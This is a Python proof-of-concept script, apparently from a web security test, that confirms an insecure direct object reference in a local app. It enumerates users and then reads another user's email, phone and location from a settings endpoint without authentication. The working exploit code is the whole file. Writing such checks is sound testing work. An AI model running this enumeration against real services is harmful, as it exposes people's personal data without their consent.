#!/usr/bin/env python3
"""
WSTG-ATHZ-04: Insecure Direct Object Reference — User Settings
Demonstrates that any user's settings can be read without authentication.
Expected: 200 response containing the target user's email and phone.
"""

import requests

BASE = "http://localhost:3000"


def main():
    print("[*] WSTG-ATHZ-04: User Settings IDOR PoC")
    print("=" * 50)

    # Step 1: Get list of all users
    print("[*] Enumerating users...")
    users_resp = requests.get(f"{BASE}/api/users")
    assert users_resp.status_code == 200, "Expected 200 — users endpoint accessible"
    users = users_resp.json()["users"]
    print(f"[+] Found {len(users)} users")

    # Step 2: Pick two different users
    user1 = users[0]
    user2 = users[1]

    print(f"[*] User 1: {user1['display_name']} (ID: {user1['id']})")
    print(f"[*] User 2: {user2['display_name']} (ID: {user2['id']})")

    # Step 3: Access user2's settings without any authentication
    print(f"[*] Accessing {user2['display_name']}'s settings without auth...")
    resp = requests.get(f"{BASE}/api/users/{user2['id']}/settings")

    print(f"\n[+] Status Code: {resp.status_code}")

    if resp.status_code == 200:
        data = resp.json()
        email = data.get("settings", {}).get("email", "N/A")
        phone = data.get("settings", {}).get("phone", "N/A")
        location = data.get("settings", {}).get("location", "N/A")

        print(f"\n[+] Leaked PII:")
        print(f"    Email: {email}")
        print(f"    Phone: {phone}")
        print(f"    Location: {location}")

        print("\n" + "=" * 50)
        print("[VULNERABLE] User Settings IDOR confirmed")
        print("=" * 50)
        print("\nAny unauthenticated user can access anyone's PII")
    else:
        print(f"\n[-] Status {resp.status_code} — IDOR may be patched")


if __name__ == "__main__":
    main()
